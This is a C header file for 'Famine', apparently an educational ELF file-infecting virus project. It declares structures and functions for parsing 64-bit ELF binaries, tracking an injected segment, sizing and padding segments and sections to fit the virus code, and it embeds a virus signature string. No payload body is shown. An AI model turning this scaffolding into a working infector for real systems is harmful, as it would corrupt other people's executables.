#ifndef FAMINE_H
# define FAMINE_H

#define _GNU_SOURCE

# include <dirent.h>
# include <elf.h>
# include <errno.h>
# include <fcntl.h>
# include <libgen.h>
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <sys/mman.h>
# include <unistd.h>

# ifndef INJECT
#  define INJECT
# endif

# ifndef INJECT_SIZE
#  define INJECT_SIZE 0
# endif

# define SIGNATURE "Famine version 1.0 (c)oded by lmartin"

# define PAGE_SIZE 0x1000

# define CORRUPTED_FILE -1

typedef struct		s_elf
{
	char			*filename;
	void			*addr;
	long			size;
	Elf64_Ehdr		*header;
	Elf64_Phdr		*segments;
	Elf64_Shdr		*sections;
	Elf64_Phdr		*pt_load; /* injected segment */
	Elf64_Shdr		*text_section;
}					t_elf;

int			get_size_needed(t_elf *elf, t_elf *virus_elf);

/* elf.c */
int		init_elf(t_elf *elf, void *addr, long size);
int		check_magic_elf(void *addr);

/* padding.c */
void	*add_padding_segments(t_elf *elf, t_elf *virus_elf, void *src, void **dst, int nb_zero);
void	*add_padding_sections(t_elf *elf, t_elf *virus_elf, void *src, void **dst, int nb_zero);

/* utils.c */
void	*ft_memmem(const void *l, size_t l_len, const void *s, size_t s_len);
size_t	ft_strlen(const char *s);
int		ft_strcmp(const char *s1, const char *s2);
void	*ft_memset(void *b, int c, size_t len);
void	*ft_memcpy(void *dst, const void *src, size_t n);

/* DEBUG */

# define _RED		"\e[31m"
# define _GREEN		"\e[32m"
# define _YELLOW	"\e[33m"
# define _BLUE		"\e[34m"
# define _END		"\e[0m"

# ifndef DEBUG
#  define DEBUG 0
# endif

/* debug.c */
void	debug_print_error(int code, char *prg, char *input);
void	debug_print_elf(t_elf *elf);
void	debug_print_args(int argc, char *argv[]);

#endif
